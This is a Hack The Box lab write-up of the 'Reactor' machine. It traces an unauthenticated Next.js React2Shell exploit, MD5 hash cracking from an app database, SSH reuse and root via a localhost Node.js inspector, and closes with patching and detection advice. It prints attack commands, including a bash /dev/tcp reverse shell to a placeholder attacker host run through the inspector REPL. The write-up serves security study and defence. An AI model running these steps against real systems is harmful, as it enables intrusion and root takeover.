---
title: "Reactor: Next.js React2Shell RCE and a Root Node.js Inspector"
description: "An Easy Linux Hack The Box machine where a vulnerable Next.js App Router build allows unauthenticated RCE through React2Shell, a cracked MD5 hash grants SSH, and a root-owned Node.js inspector yields a root shell."
type: case-study
platform: Hack The Box
content_type: machine
category: pentest
status: published-ready
addedAt: "2026-10-05"
tags:
  - htb
  - linux
  - machine
  - nextjs
  - react2shell
  - cve-2025-55182
  - sqlite
  - md5
  - nodejs
  - privilege-escalation
objective: "Trace the path from an unauthenticated Next.js React2Shell RCE to a service foothold, SSH as a recovered application account, and root through a local Node.js inspector."
tools:
  - rustscan
  - nmap
  - python3
  - node
  - hashcat
  - ssh
  - netstat
skill: "Next.js and React Server Components exploitation, application database credential recovery, and Node.js inspector abuse for privilege escalation."
outcome: "Unauthenticated code execution as the Node.js service account, SSH access as a recovered application user, and a root shell from inside the inspected root process."
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux (Ubuntu), Next.js App Router monitoring dashboard on port 3000, OpenSSH |
| Starting position | Unauthenticated |
| Objective | Reach root through the exposed web application and local service configuration |
| Outcome | Code execution as the `node` service account, SSH access as `engineer`, and root command execution |

## From React2Shell to a root inspector

Reactor is an Easy Linux box whose only external surfaces are SSH and a Next.js monitoring dashboard on port 3000. The dashboard runs Next.js 15.0.3 with the App Router, which is inside the affected range for React2Shell, a pre-authentication deserialization flaw in React Server Components. Exploiting it drops a shell as the `node` service account. From there the application SQLite database exposes MD5 password hashes, and cracking one recovers a password that authenticates over SSH for the `engineer` account. On the host, a root-owned Node.js process exposes its inspector on localhost, and forwarding that port over SSH allows JavaScript evaluation inside the privileged process, which produces a root shell.

Target and attacker addresses are replaced with role-based placeholders, and credential values are redacted; command syntax is preserved.

**Attack path:**

1. Next.js App Router dashboard on port 3000.
2. React2Shell pre-authentication RCE as the `node` service account.
3. `reactor.db` recovered from the application directory.
4. Cracked MD5 hash for `engineer`.
5. SSH login as `engineer`.
6. Localhost Node.js inspector on 127.0.0.1:9229.
7. Root command execution from inside the inspected process.

## Target, service discovery, and objective

The target is a Hack The Box lab machine. Scope was limited to the two exposed services, the application's own filesystem as reachable from the service account, and local configuration discoverable after foothold. The objective was to move from an unauthenticated position to a privileged shell and to record each trust boundary that the path crossed.

The source note does not include the contents of the scanner or the exploit script, so the request shapes below are reconstructed from the recorded command lines. The framework version and the service responses are taken directly from the recorded output.

## Evidence: App Router RCE to inspector abuse

### Service fingerprint

Observation: the full-port scan returned two open ports, but Nmap could not identify the service on 3000.

Action:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Reactor-TCP
```

Result:

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
```

Because Nmap could not name the service on 3000, I checked an HTTP response and the client bundle for a framework version.

```text
HTTP/1.1 200 OK
X-Powered-By: Next.js
Content-Type: text/html; charset=utf-8
```

```text
window.next={version:"15.0.3",appDir:!0}
```

Significance: `X-Powered-By` identifies Next.js and the bundle exposes version 15.0.3 with the App Router enabled (`appDir:!0`). Version 15.0.3 is inside the affected range for the React Server Components flaw behind React2Shell.

### React2Shell RCE (CVE-2025-55182)

Observation: the dashboard is a Next.js App Router application, which exposes React Server Function endpoints to unauthenticated requests.

Action: a public React2Shell scanner confirmed the surface, then a public exploit script triggered a reverse shell. The script contents were not included in the source.

```bash
uv run python3 scanner.py -u http://<TARGET_IP>:3000/
```

```text
============================================================
SCAN SUMMARY
============================================================
  Total hosts scanned: 1
  Vulnerable: 1
  Not vulnerable: 0
  Errors: 0
============================================================
```

```bash
nc -lvnp <LPORT>
```

```bash
node react2shell.js http://<TARGET_IP>:3000 shell <ATTACKER_IP> <LPORT>
```

Result: the listener returned a shell as the Node.js service user.

```text
node@reactor:/home$ whoami
node
```

Significance: this is unauthenticated remote code execution in the web application's runtime account. The request is deserialized by React before any application-level authorization runs, so no dashboard credential is needed. The React project tracks the flaw as CVE-2025-55182; the Next.js advisory published it as CVE-2025-66478, which NVD later marked a rejected duplicate.

### Application database credential recovery

Observation: the process runs from `/opt/reactor-app`, and local application files are readable in the service account's context.

Action: search for local database files, then read the recovered database offline.

```bash
find / -type f \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \) 2>/dev/null
```

```text
/opt/reactor-app/reactor.db
```

```text
admin:<MD5_HASH>
engineer:<MD5_HASH>
```

The stored hashes are unsalted MD5, so they are crackable with a wordlist.

```bash
hashcat hash.list /wordlists/rockyou.txt -D2 -m0
```

Result: hashcat recovered the credential for `engineer`.

```text
<MD5_HASH>:<RECOVERED_PASSWORD>
```

Significance: the application stores account passwords as unsalted MD5, and the service account can read the database that holds them. The recovered password was then tested against SSH.

### SSH access as the application user

Action:

```bash
ssh engineer@<TARGET_IP>
```

Result: the password recovered from the database authenticated as `engineer`.

```text
engineer@reactor:~$
```

Significance: a credential recovered from the web application's own data crosses into host access because the same account exists on the system with the same password. The source notes record this authentication and show the resulting prompt; no separate hash or account enumeration was needed.

### Privilege escalation through the Node.js inspector

Observation: local service enumeration as `engineer` showed a Node.js inspector bound to localhost.

```bash
netstat -tulpn
```

```text
tcp  0  0 127.0.0.1:9229  0.0.0.0:*  LISTEN
```

```text
node,<PID> --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Action: the inspector listens only on localhost, so forward it over the existing SSH session and attach a debugger to it.

```bash
ssh -L 9220:127.0.0.1:9229 engineer@<TARGET_IP>
```

```bash
node inspect 127.0.0.1:9220
```

```text
debug> repl
```

The inspected process is root-owned, so a command evaluated in its REPL runs as root.

```javascript
process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1"')
```

Result:

```text
root@reactor:/#
```

Significance: the Node.js inspector is a code-execution interface for the process it is attached to. Binding it to localhost does not make it safe, because any account that can forward that port reaches it. When the process runs as root, the inspector is equivalent to root command execution.

## Outcome: React2Shell to root command execution

The path moved through three trust boundaries. Initial access came from the web application's publicly reachable deserialization surface, which granted code execution as an unprivileged service account. The application database then supplied a host credential because the same account and password existed on the system. Root followed from a debug interface left bound to localhost on a privileged process.

Two details in the source limit the record. The exploit and scanner scripts were not included, so their request payloads are reconstructed from the recorded invocations. The recovered `engineer` password authenticated over SSH as recorded; the note shows the resulting shell prompt but not the full authentication exchange.

## Recommendations: patching, credential reuse, and the inspector

The React2Shell exposure is a patch problem. The running version was inside the affected range of a pre-authentication flaw, and the framework version was disclosed by the application itself.

- *Recommendation:* patch Next.js and the underlying React Server Components packages to a fixed release as soon as an advisory is published. The Next.js advisory provides a codemod (`npx fix-react2shell-next`) and lists the fixed versions.
- *Detection:* monitor outbound connections from web application workers. A React Server Function endpoint that starts a shell connecting to an external host is unusual for a monitoring dashboard.
- *Validation:* inventory the framework version the build deployed, not the version recorded in `package.json`. The bundle here disclosed 15.0.3, which a build-pipeline check could have flagged against the advisory range.

The credential reuse enabled the second boundary.

- *Recommendation:* stop storing passwords as unsalted MD5, and do not give application accounts system logins that share the same password. Hash with a memory-hard algorithm and keep application identities separate from host identities.
- *Detection:* alert on a successful SSH login for an account that also authenticates to the web application, particularly from a source that did not previously use SSH.
- *Validation:* test that a password recovered from an application database does not authenticate to any other service.

The inspector exposure is a local configuration failure with a large blast radius.

- *Recommendation:* never run a privileged Node.js service with `--inspect` in production. Node.js documents the inspector as a debugging interface that exposes code execution inside the process, and its guidance is to avoid enabling it outside development and to restrict access when it is required.
- *Detection:* alert on any process listening on port 9229 outside a known debugging window, and on SSH local port forwards to that port.
- *Validation:* after a deploy, confirm the production process was started without `--inspect` and without an inspector port bound.

## References

- [Hack The Box: Reactor](https://app.hackthebox.com/machines/Reactor)
- [Next.js security advisory: CVE-2025-66478 (React2Shell)](https://nextjs.org/blog/CVE-2025-66478)
- [NVD: CVE-2025-55182, React Server Components deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [React2Shell project](https://react2shell.com/)
- [Node.js: debugging and the inspector](https://nodejs.org/en/learn/getting-started/debugging)
- [Hashcat: mask and wordlist attacks](https://hashcat.net/hashcat/)
- [RustScan](https://github.com/RustScan/RustScan)
- [Nmap](https://nmap.org/)
